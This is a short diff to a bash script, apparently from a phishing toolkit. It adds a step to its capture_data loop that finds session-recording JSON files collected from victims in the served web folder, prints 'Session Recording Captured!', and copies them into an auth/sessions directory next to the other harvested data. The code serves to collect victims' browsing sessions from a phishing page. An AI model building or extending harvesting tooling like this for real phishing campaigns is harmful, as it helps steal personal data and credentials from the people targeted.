@@ -309,6 +309,18 @@ capture_data() {
 			rm -rf .server/www/fingerprints.txt
 		fi
 		
+		# Check for session recordings
+		if [[ -d ".server/www/sessions" ]]; then
+			session_count=$(ls -1 .server/www/sessions/*.json 2>/dev/null | wc -l)
+			if [[ $session_count -gt 0 ]]; then
+				echo -ne "\n${RED}[${WHITE}-${RED}]${CYAN} Session Recording Captured!"
+				echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/sessions/${WHITE}"
+				# Move to auth directory
+				mkdir -p auth/sessions
+				cp -r .server/www/sessions/* auth/sessions/ 2>/dev/null
+			fi
+		fi
+		
 		sleep 0.75
 	done
 }
